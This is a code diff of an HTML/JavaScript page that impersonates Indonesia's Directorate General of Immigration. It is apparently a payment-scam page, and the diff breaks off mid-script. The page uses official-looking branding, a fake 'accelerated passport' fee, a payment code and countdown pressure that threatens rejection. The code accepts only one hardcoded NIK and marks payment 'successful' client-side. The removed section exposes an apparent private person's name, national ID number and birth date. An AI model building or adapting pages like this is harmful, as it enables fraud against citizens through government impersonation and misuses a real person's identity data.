@@ -3,488 +3,571 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pembayaran Permohonan Paspor Baru</title>
+    <title>Layanan Paspor - Ditjen Imigrasi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .gradient-bg {
+            background: linear-gradient(135deg, #1a3a5f 0%, #0c1e36 100%);
         }
-        
-        body {
-            background-color: rgba(0, 0, 0, 0.7);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+        .card-shadow {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
         }
-        
-        .popup-container {
-            background-color: white;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 500px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            position: relative;
+        .pulse-animation {
+            animation: pulse 2s infinite;
         }
-        
-        .header {
-            background-color: #003366;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .countdown {
+            animation: countdown 2s linear infinite;
+        }
+        @keyframes countdown {
+            0% { color: #ef4444; }
+            50% { color: #f97316; }
+            100% { color: #ef4444; }
+        }
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .copy-feedback {
+            position: absolute;
+            top: -30px;
+            right: 0;
+            background-color: #10b981;
             color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .logo {
-            max-width: 120px;
-            margin-bottom: 15px;
-        }
-        
-        .title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .subtitle {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .content {
-            padding: 25px;
-        }
-        
-        .info-section {
-            margin-bottom: 20px;
-        }
-        
-        .info-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #003366;
-            margin-bottom: 10px;
-            border-bottom: 1px solid #eaeaea;
-            padding-bottom: 5px;
-        }
-        
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-        
-        .info-label {
-            font-weight: 500;
-            color: #555;
-        }
-        
-        .info-value {
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .payment-info {
-            background-color: #f8f9fa;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .payment-amount {
-            font-size: 24px;
-            font-weight: bold;
-            color: #e63946;
-            text-align: center;
-            margin: 10px 0;
-        }
-        
-        .payment-code {
-            font-size: 18px;
-            font-weight: bold;
-            color: #003366;
-            text-align: center;
-            margin: 15px 0;
-            letter-spacing: 1px;
-            user-select: all;
-            cursor: pointer;
-            padding: 8px;
+            padding: 4px 8px;
             border-radius: 4px;
-            transition: background-color 0.3s;
-        }
-        
-        .payment-code:hover {
-            background-color: #eaeaea;
-        }
-        
-        .copy-hint {
             font-size: 12px;
-            color: #666;
-            text-align: center;
-            margin-top: 5px;
-            font-style: italic;
+            opacity: 0;
+            transition: opacity 0.3s;
         }
-        
-        .timer-container {
-            text-align: center;
-            margin: 20px 0;
+        .copy-feedback.show {
+            opacity: 1;
         }
-        
-        .timer-label {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 5px;
+        .success-notification {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
         }
-        
-        .timer {
-            font-size: 24px;
-            font-weight: bold;
-            color: #e63946;
-            padding: 10px;
-            border: 2px solid #e63946;
-            border-radius: 5px;
-            display: inline-block;
-            min-width: 200px;
-        }
-        
-        .warning {
-            background-color: #fff8e1;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: #5d4037;
-        }
-        
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            margin-top: 25px;
-            gap: 10px;
-        }
-        
-        .btn {
-            background-color: #003366;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        
-        .btn:hover {
-            background-color: #002244;
-        }
-        
-        .btn-download {
-            background-color: #28a745;
-        }
-        
-        .btn-download:hover {
-            background-color: #218838;
-        }
-        
-        .footer {
-            background-color: #f1f1f1;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .copyright {
-            font-weight: 500;
-        }
-        
-        .office-address {
-            background-color: #f0f7ff;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #003366;
-        }
-        
-        .office-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #003366;
-            margin-bottom: 8px;
-        }
-        
-        .office-details {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .agency-info {
-            background-color: #f0fff0;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #28a745;
-        }
-        
-        .agency-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #28a745;
-            margin-bottom: 8px;
-        }
-        
-        .agency-name {
-            font-size: 14px;
-            color: #333;
-            font-weight: 600;
-        }
-        
-        .agency-email {
-            font-size: 14px;
-            color: #555;
-            margin-top: 5px;
-        }
-        
-        @media (max-width: 480px) {
-            .popup-container {
-                max-width: 100%;
-            }
-            
-            .title {
-                font-size: 16px;
-            }
-            
-            .subtitle {
-                font-size: 13px;
-            }
-            
-            .content {
-                padding: 20px 15px;
-            }
-            
-            .payment-amount {
-                font-size: 20px;
-            }
-            
-            .payment-code {
-                font-size: 16px;
-            }
-            
-            .timer {
-                font-size: 20px;
-                min-width: 180px;
-            }
-            
-            .btn-container {
-                flex-direction: column;
-            }
+        .disabled-btn {
+            background: linear-gradient(135deg, #9ca3af 0%, #6b7280 100%);
+            cursor: not-allowed;
         }
     </style>
 </head>
-<body>
-    <div class="popup-container">
-        <div class="header">
-            <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">PEMBAYARAN PERMOHONAN</div>
-            <div class="subtitle">Pembayaran Permohonan Paspor Baru</div>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="gradient-bg text-white py-6 px-4 shadow-lg">
+        <div class="container mx-auto flex flex-col items-center">
+            <img src="https://z-cdn-media.chatglm.cn/files/b1315eb8-2f2a-4f48-b81b-c34b15296595_Logo%20Ditjen%20Imigrasi.png?auth_key=1761627953-ee3340ef783e480dbd0e9eaeaec9603d-0-f7566d94188a55ce702317884c021c9c" alt="Logo Ditjen Imigrasi" class="h-24 mb-4">
+            <h1 class="text-2xl font-bold">Layanan Paspor Online</h1>
+            <p class="text-blue-200 mt-1">Ditjen Imigrasi - Kementerian Hukum dan HAM RI</p>
         </div>
-        
-        <div class="content">
-            <div class="info-section">
-                <div class="info-title">Data Pemohon</div>
-                <div class="info-row">
-                    <span class="info-label">Nama</span>
-                    <span class="info-value">SA'YAH</span>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8 max-w-4xl">
+        <!-- Feature Cards -->
+        <section class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
+            <!-- Pusat Bantuan -->
+            <div class="bg-white rounded-xl p-6 card-shadow transition-all duration-300 hover:shadow-xl">
+                <div class="bg-blue-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
+                    <i class="fas fa-headset text-blue-700 text-2xl"></i>
                 </div>
-                <div class="info-row">
-                    <span class="info-label">NIK</span>
-                    <span class="info-value">5201124107770010</span>
+                <h3 class="text-xl font-semibold text-gray-800 mb-2">Pusat Bantuan</h3>
+                <p class="text-gray-600 mb-4">Dapatkan informasi dan bantuan seputar layanan paspor</p>
+                <button class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Buka Bantuan</span>
+                    <div class="spinner ml-2"></div>
+                </button>
+            </div>
+
+            <!-- Cek Permohonan -->
+            <div class="bg-white rounded-xl p-6 card-shadow transition-all duration-300 hover:shadow-xl">
+                <div class="bg-green-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
+                    <i class="fas fa-search text-green-700 text-2xl"></i>
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Tanggal Lahir</span>
-                    <span class="info-value">SESAOT, 01-07-1977</span>
+                <h3 class="text-xl font-semibold text-gray-800 mb-2">Cek Permohonan Anda</h3>
+                <p class="text-gray-600 mb-4">Lacak status pengajuan paspor Anda secara online</p>
+                <button class="w-full bg-green-600 hover:bg-green-700 text-white py-2 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Cek Status</span>
+                    <div class="spinner ml-2"></div>
+                </button>
+            </div>
+
+            <!-- Laporkan Masalah -->
+            <div class="bg-white rounded-xl p-6 card-shadow transition-all duration-300 hover:shadow-xl">
+                <div class="bg-red-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
+                    <i class="fas fa-exclamation-triangle text-red-700 text-2xl"></i>
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Jenis Kelamin</span>
-                    <span class="info-value">Perempuan</span>
+                <h3 class="text-xl font-semibold text-gray-800 mb-2">Laporkan Masalah</h3>
+                <p class="text-gray-600 mb-4">Sampaikan keluhan atau masalah yang Anda temui</p>
+                <button class="w-full bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Laporkan</span>
+                    <div class="spinner ml-2"></div>
+                </button>
+            </div>
+        </section>
+
+        <!-- Layanan Percepatan -->
+        <section class="bg-white rounded-xl p-6 card-shadow mb-10">
+            <div class="flex flex-col md:flex-row items-center">
+                <div class="md:w-2/3 mb-6 md:mb-0 md:pr-6">
+                    <h2 class="text-2xl font-bold text-gray-800 mb-4">Layanan Percepatan Paspor</h2>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex items-start">
+                            <i class="fas fa-check-circle text-green-500 mt-1 mr-3"></i>
+                            <p class="text-gray-700">Paspor jadi dalam <span class="font-bold text-blue-600">1 hari kerja</span></p>
+                        </div>
+                        <div class="flex items-start">
+                            <i class="fas fa-check-circle text-green-500 mt-1 mr-3"></i>
+                            <p class="text-gray-700">Proses cepat tanpa antri</p>
+                        </div>
+                        <div class="flex items-start">
+                            <i class="fas fa-check-circle text-green-500 mt-1 mr-3"></i>
+                            <p class="text-gray-700">Dapat prioritas jadwal</p>
+                        </div>
+                        <div class="flex items-start">
+                            <i class="fas fa-check-circle text-green-500 mt-1 mr-3"></i>
+                            <p class="text-gray-700">Layanan premium dengan biaya terjangkau</p>
+                        </div>
+                    </div>
+                    <button id="accelerationBtn" class="bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-700 hover:to-indigo-800 text-white font-semibold py-3 px-8 rounded-lg transition-all duration-300 pulse-animation flex items-center justify-center">
+                        <i class="fas fa-bolt mr-2"></i> 
+                        <span>Gunakan Layanan Percepatan</span>
+                        <div class="spinner ml-2"></div>
+                    </button>
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Status Layanan</span>
-                    <span class="info-value">Permohonan Paspor Baru - Paspor Elektronik 5 Tahun</span>
+                <div class="md:w-1/3 flex justify-center">
+                    <div class="bg-gradient-to-br from-blue-50 to-indigo-100 rounded-xl p-6 w-full max-w-xs">
+                        <div class="text-center">
+                            <i class="fas fa-passport text-5xl text-blue-600 mb-4"></i>
+                            <p class="text-sm text-gray-600 mb-2">Biaya Layanan</p>
+                            <p class="text-2xl font-bold text-blue-700">Rp 503.500</p>
+                            <p class="text-xs text-gray-500 mt-2">Hemat waktu dan tenaga</p>
+                        </div>
+                    </div>
                 </div>
             </div>
-            
-            <div class="agency-info">
-                <div class="agency-title">Agency Pendaftaran</div>
-                <div class="agency-name">WIJAYA ERICK SM.SH</div>
-                <div class="agency-email">Email: Birojasa@semarang.com</div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-6 px-4">
+        <div class="container mx-auto text-center">
+            <p class="text-sm">© 2023 Hak Cipta Dilindungi - Ditjen Imigrasi Republik Indonesia</p>
+            <p class="text-xs text-gray-400 mt-2">Kementerian Hukum dan Hak Asasi Manusia Republik Indonesia</p>
+        </div>
+    </footer>
+
+    <!-- Form Input NIK (Hidden by default) -->
+    <div id="nikForm" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-white rounded-xl w-full max-w-md p-6">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-xl font-bold text-gray-800">Masukkan NIK KTP</h3>
+                <button id="closeNikForm" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
             </div>
-            
-            <div class="office-address">
-                <div class="office-title">Kantor Imigrasi</div>
-                <div class="office-details">
-                    <strong>Kantor Imigrasi Mataram</strong><br>
-                    Jl. Udayana<br>
-                    Mataram, Nusa Tenggara Barat
-                </div>
+            <p class="text-gray-600 mb-6">Masukkan Nomor Induk Kependudukan (NIK) Anda untuk melanjutkan layanan percepatan</p>
+            <div class="mb-6">
+                <label for="nikInput" class="block text-gray-700 font-medium mb-2">NIK KTP</label>
+                <input type="text" id="nikInput" placeholder="Contoh: 3201012345670001" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
             </div>
-            
-            <div class="payment-info">
-                <div class="info-title">Informasi Pembayaran</div>
-                <div class="info-row">
-                    <span class="info-label">Jumlah Pembayaran</span>
-                </div>
-                <div class="payment-amount">Rp 653.500,00</div>
-                <div class="info-row">
-                    <span class="info-label">Kode Pembayaran</span>
-                </div>
-                <div class="payment-code" id="paymentCode">135036000033385655</div>
-                <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
-            </div>
-            
-            <div class="timer-container">
-                <div class="timer-label">Batas Waktu Pembayaran</div>
-                <div class="timer" id="countdown">02:00:00</div>
-            </div>
-            
-            <div class="warning">
-                <strong>Perhatian:</strong> Harap melakukan pembayaran sebelum batas waktu yang ditentukan. Apabila batas waktu telah habis dan Anda belum melakukan pembayaran, maka permohonan Anda akan ditolak oleh sistem secara otomatis. Pastikan Anda tidak melakukan pembayaran di luar batas waktu yang telah ditentukan untuk menghindari penolakan permohonan.
-            </div>
-            
-            <div class="btn-container">
-                <button class="btn" onclick="window.print()">Cetak Bukti</button>
-                <button class="btn btn-download" id="downloadBtn" onclick="showDownloadNotice()">Unduh Surat Jadwal Kedatangan</button>
+            <div class="flex space-x-3">
+                <button id="cancelNik" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Batal</span>
+                    <div class="spinner ml-2"></div>
+                </button>
+                <button id="submitNik" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Lanjut</span>
+                    <div class="spinner ml-2"></div>
+                </button>
             </div>
         </div>
-        
-        <div class="footer">
-            <div class="copyright">Hak Cipta © 2023 Direktorat Jenderal Imigrasi Republik Indonesia</div>
+    </div>
+
+    <!-- Payment Popup (Hidden by default) -->
+    <div id="paymentPopup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-white rounded-xl w-full max-w-md p-6">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-xl font-bold text-gray-800">Pembayaran Layanan Percepatan</h3>
+                <button id="closePayment" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
+            </div>
+            
+            <div class="bg-blue-50 rounded-lg p-4 mb-6">
+                <div class="flex justify-between items-center mb-3">
+                    <span class="text-gray-600">Total Pembayaran</span>
+                    <span class="text-2xl font-bold text-blue-700">Rp 503.500,00</span>
+                </div>
+                <div class="flex justify-between items-center relative">
+                    <span class="text-gray-600">Kode Pembayaran</span>
+                    <div class="flex items-center">
+                        <span id="paymentCode" class="font-mono font-bold text-gray-800 mr-2">135036000033386035</span>
+                        <button id="copyCode" class="text-blue-600 hover:text-blue-800">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <div id="copyFeedback" class="copy-feedback">Tersalin!</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-circle text-yellow-500 mt-1 mr-3"></i>
+                    <div>
+                        <p class="font-medium text-gray-800">Batas Waktu Pembayaran</p>
+                        <p class="text-gray-700">Selesaikan pembayaran dalam:</p>
+                        <p id="countdown" class="text-xl font-bold countdown">02:00:00</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="mb-6">
+                <p class="text-gray-700 mb-3">Silakan lakukan pembayaran melalui:</p>
+                <div class="grid grid-cols-3 gap-3">
+                    <div class="bg-gray-100 rounded-lg p-3 flex flex-col items-center">
+                        <i class="fab fa-cc-visa text-3xl text-blue-700 mb-1"></i>
+                        <span class="text-xs">Kartu Kredit</span>
+                    </div>
+                    <div class="bg-gray-100 rounded-lg p-3 flex flex-col items-center">
+                        <i class="fas fa-university text-3xl text-green-600 mb-1"></i>
+                        <span class="text-xs">Transfer Bank</span>
+                    </div>
+                    <div class="bg-gray-100 rounded-lg p-3 flex flex-col items-center">
+                        <i class="fas fa-mobile-alt text-3xl text-purple-600 mb-1"></i>
+                        <span class="text-xs">E-Wallet</span>
+                    </div>
+                </div>
+            </div>
+            
+            <button id="paymentContinue" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                <span>Lanjut</span>
+                <div class="spinner ml-2"></div>
+            </button>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div id="notification" class="fixed bottom-4 right-4 bg-red-500 text-white px-6 py-4 rounded-lg shadow-lg transform transition-transform duration-300 translate-y-20 z-50">
+        <div class="flex items-center">
+            <i class="fas fa-exclamation-circle mr-3 text-xl"></i>
+            <p>Harap selesaikan dulu pembayaran layanan percepatan sebelum lanjut</p>
+        </div>
+    </div>
+
+    <!-- Success Notification -->
+    <div id="successNotification" class="fixed bottom-4 right-4 success-notification text-white px-6 py-4 rounded-lg shadow-lg transform transition-transform duration-300 translate-y-20 z-50">
+        <div class="flex items-center">
+            <i class="fas fa-check-circle mr-3 text-xl"></i>
+            <p>Anda sudah berhasil melakukan pembayaran ini</p>
         </div>
     </div>
 
     <script>
-        // Fungsi untuk menampilkan catatan saat tombol unduh diklik
-        function showDownloadNotice() {
-            // Buat elemen untuk menampilkan pesan
-            const notice = document.createElement('div');
-            notice.style.position = 'fixed';
-            notice.style.top = '0';
-            notice.style.left = '0';
-            notice.style.width = '100%';
-            notice.style.backgroundColor = '#ff9800';
-            notice.style.color = 'white';
-            notice.style.padding = '15px';
-            notice.style.textAlign = 'center';
-            notice.style.zIndex = '1000';
-            notice.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
-            notice.innerHTML = '<strong>Perhatian:</strong> Harap lakukan pembayaran terlebih dahulu.';
-            
-            // Tambahkan ke body
-            document.body.appendChild(notice);
-            
-            // Hapus pesan setelah 5 detik
-            setTimeout(() => {
-                notice.style.opacity = '0';
-                notice.style.transition = 'opacity 0.5s';
-                setTimeout(() => {
-                    document.body.removeChild(notice);
-                }, 500);
-            }, 5000);
-        }
+        // Elements
+        const accelerationBtn = document.getElementById('accelerationBtn');
+        const nikForm = document.getElementById('nikForm');
+        const closeNikForm = document.getElementById('closeNikForm');
+        const cancelNik = document.getElementById('cancelNik');
+        const submitNik = document.getElementById('submitNik');
+        const nikInput = document.getElementById('nikInput');
+        const paymentPopup = document.getElementById('paymentPopup');
+        const closePayment = document.getElementById('closePayment');
+        const paymentContinue = document.getElementById('paymentContinue');
+        const notification = document.getElementById('notification');
+        const successNotification = document.getElementById('successNotification');
+        const countdownEl = document.getElementById('countdown');
+        const copyCode = document.getElementById('copyCode');
+        const copyFeedback = document.getElementById('copyFeedback');
+        const paymentCode = document.getElementById('paymentCode');
         
-        // Fungsi untuk menyalin kode pembayaran
-        document.getElementById('paymentCode').addEventListener('click', function() {
-            // Membuat elemen input sementara
-            const tempInput = document.createElement('input');
-            tempInput.value = this.textContent;
-            document.body.appendChild(tempInput);
-            
-            // Memilih dan menyalin teks
-            tempInput.select();
-            document.execCommand('copy');
-            
-            // Menghapus elemen input sementara
-            document.body.removeChild(tempInput);
-            
-            // Memberi tahu pengguna bahwa kode telah disalin
-            const originalText = this.textContent;
-            this.textContent = "Tersalin!";
-            this.style.backgroundColor = "#e6f7e6";
-            
-            // Mengembalikan teks asli setelah 2 detik
-            setTimeout(() => {
-                this.textContent = originalText;
-                this.style.backgroundColor = "";
-            }, 2000);
-        });
+        // Valid NIK - Hanya NIK ini yang bisa melihat kode pembayaran
+        const validNIK = "5201124107770010";
         
-        // Set waktu awal (2 jam dalam detik)
-        const initialTime = 2 * 60 * 60;
+        // Check if payment timer is already running
+        let paymentTimer;
+        let timeLeft;
         
-        // Cek apakah ada waktu tersisa di localStorage
-        let timeLeft = localStorage.getItem('paymentTimeLeft') 
-            ? parseInt(localStorage.getItem('paymentTimeLeft')) 
-            : initialTime;
-        
-        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
-        if (timeLeft <= 0) {
-            timeLeft = initialTime;
-        }
-        
-        // Simpan waktu tersisa ke localStorage
-        localStorage.setItem('paymentTimeLeft', timeLeft);
-        
-        // Update tampilan countdown
-        function updateCountdown() {
-            const hours = Math.floor(timeLeft / 3600);
-            const minutes = Math.floor((timeLeft % 3600) / 60);
-            const seconds = timeLeft % 60;
+        // Initialize from localStorage if available
+        function initializeTimer() {
+            const savedTime = localStorage.getItem('paymentTimeLeft');
+            const paymentCompleted = localStorage.getItem('paymentCompleted');
             
-            // Format tampilan waktu
-            const formattedTime = 
-                String(hours).padStart(2, '0') + ':' + 
-                String(minutes).padStart(2, '0') + ':' + 
-                String(seconds).padStart(2, '0');
+            // Check if payment is completed
+            if (paymentCompleted === 'true') {
+                // Change button to disabled state
+                setButtonToCompleted();
+                return;
+            }
             
-            document.getElementById('countdown').textContent = formattedTime;
-            
-            // Simpan waktu tersisa ke localStorage
-            localStorage.setItem('paymentTimeLeft', timeLeft);
-            
-            // Kurangi waktu
-            timeLeft--;
-            
-            // Jika waktu habis
-            if (timeLeft < 0) {
-                clearInterval(timerInterval);
-                document.getElementById('countdown').textContent = "WAKTU HABIS";
-                document.getElementById('countdown').style.color = "#ff0000";
-                
-                // Tampilkan pemberitahuan bahwa permohonan ditolak
-                const warning = document.querySelector('.warning');
-                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis. Anda harus membuat permohonan baru jika masih ingin mengajukan paspor.";
-                warning.style.backgroundColor = "#ffebee";
-                warning.style.borderLeftColor = "#f44336";
-                warning.style.color = "#c62828";
-                
-                // Nonaktifkan tombol cetak dan unduh
-                document.querySelectorAll('.btn').forEach(btn => {
-                    btn.disabled = true;
-                    btn.style.backgroundColor = "#cccccc";
-                    btn.style.cursor = "not-allowed";
-                });
+            if (savedTime) {
+                timeLeft = parseInt(savedTime);
+                if (timeLeft > 0) {
+                    // If there's still time left and user has valid NIK, show payment popup
+                    const savedNIK = localStorage.getItem('userNIK');
+                    if (savedNIK === validNIK) {
+                        paymentPopup.classList.remove('hidden');
+                        startCountdown();
+                    }
+                } else {
+                    // Time has expired
+                    localStorage.removeItem('paymentTimeLeft');
+                    localStorage.removeItem('userNIK');
+                }
             }
         }
         
-        // Jalankan countdown setiap detik
-        updateCountdown();
-        const timerInterval = setInterval(updateCountdown, 1000);
+        // Function to set button to completed state
+        function setButtonToCompleted() {
+            // Remove pulse animation
+            accelerationBtn.classList.remove('pulse-animation');
+            
+            // Change button appearance
+            accelerationBtn.classList.add('disabled-btn');
+            accelerationBtn.classList.remove('from-blue-600', 'to-indigo-700', 'hover:from-blue-700', 'hover:to-indigo-800');
+            
+            // Change button content
+            const icon = accelerationBtn.querySelector('i');
+            const text = accelerationBtn.querySelector('span');
+            
+            icon.className = 'fas fa-check-circle mr-2';
+            text.textContent = 'Sudah berhasil melakukan pembayaran';
+            
+            // Disable button
+            accelerationBtn.disabled = true;
+            accelerationBtn.style.cursor = 'not-allowed';
+        }
+        
+        // Show NIK Form
+        accelerationBtn.addEventListener('click', () => {
+            // Show loading spinner
+            const spinner = accelerationBtn.querySelector('.spinner');
+            const btnText = accelerationBtn.querySelector('span');
+            
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Memproses...';
+            accelerationBtn.disabled = true;
+            
+            // Simulate loading
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                btnText.textContent = 'Gunakan Layanan Percepatan';
+                accelerationBtn.disabled = false;
+                
+                nikForm.classList.remove('hidden');
+            }, 1000);
+        });
+        
+        // Close NIK Form
+        closeNikForm.addEventListener('click', () => {
+            nikForm.classList.add('hidden');
+            nikInput.value = '';
+        });
+        
+        cancelNik.addEventListener('click', () => {
+            const spinner = cancelNik.querySelector('.spinner');
+            const btnText = cancelNik.querySelector('span');
+            
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Membatalkan...';
+            cancelNik.disabled = true;
+            
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                btnText.textContent = 'Batal';
+                cancelNik.disabled = false;
+                
+                nikForm.classList.add('hidden');
+                nikInput.value = '';
+            }, 800);
+        });
+        
+        // Submit NIK
+        submitNik.addEventListener('click', () => {
+            if (nikInput.value.trim() === '') {
+                alert('Silakan masukkan NIK KTP Anda');
+                return;
+            }
+            
+            const spinner = submitNik.querySelector('.spinner');
+            const btnText = submitNik.querySelector('span');
+            
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Memvalidasi...';
+            submitNik.disabled = true;
+            
+            // Simulate validation
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                btnText.textContent = 'Lanjut';
+                submitNik.disabled = false;
+                
+                if (nikInput.value === validNIK) {
+                    // Save NIK to localStorage
+                    localStorage.setItem('userNIK', nikInput.value);
+                    
+                    // Initialize timer if not already running
+                    if (!localStorage.getItem('paymentTimeLeft')) {
+                        timeLeft = 2 * 60 * 60; // 2 hours in seconds
+                        localStorage.setItem('paymentTimeLeft', timeLeft);
+                    }
+                    
+                    nikForm.classList.add('hidden');
+                    paymentPopup.classList.remove('hidden');
+                    startCountdown();
+                } else {
+                    alert('Hanya pemegang NIK tertentu yang dapat menggunakan layanan percepatan ini');
+                }
+            }, 1500);
+        });
+        
+        // Close Payment Popup
+        closePayment.addEventListener('click', () => {
+            paymentPopup.classList.add('hidden');
+        });
+        
+        // Copy Payment Code
+        copyCode.addEventListener('click', () => {
+            const code = paymentCode.textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                copyFeedback.classList.add('show');
+                setTimeout(() => {
+                    copyFeedback.classList.remove('show');
+                }, 2000);
+            });
+        });
+        
+        // Payment Continue
+        paymentContinue.addEventListener('click', () => {
+            const spinner = paymentContinue.querySelector('.spinner');
+            const btnText = paymentContinue.querySelector('span');
+            
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Memproses...';
+            paymentContinue.disabled = true;
+            
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                btnText.textContent = 'Lanjut';
+                paymentContinue.disabled = false;
+                
+                // Mark payment as completed
+                localStorage.setItem('paymentCompleted', 'true');
+                localStorage.removeItem('paymentTimeLeft');
+                
+                paymentPopup.classList.add('hidden');
+                
+                // Change button to completed state
+                setButtonToCompleted();
+                
+                // Show success notification
+                showSuccessNotification();
+            }, 1200);
+        });
+        
+        // Show Notification
+        function showNotification() {
+            notification.classList.remove('translate-y-20');
+            
+            setTimeout(() => {
+                notification.classList.add('translate-y-20');
+            }, 3000);
+        }
+        
+        // Show Success Notification
+        function showSuccessNotification() {
+            successNotification.classList.remove('translate-y-20');
+            
+            setTimeout(() => {
+                successNotification.classList.add('translate-y-20');
+            }, 3000);
+        }
+        
+        // Countdown Timer
+        function startCountdown() {
+            // Clear any existing timer
+            if (paymentTimer) {
+                clearInterval(paymentTimer);
+            }
+            
+            // Get time from localStorage
+            timeLeft = parseInt(localStorage.getItem('paymentTimeLeft')) || (2 * 60 * 60);
+            
+            paymentTimer = setInterval(() => {
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownEl.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(paymentTimer);
+                    countdownEl.textContent = "Waktu Habis";
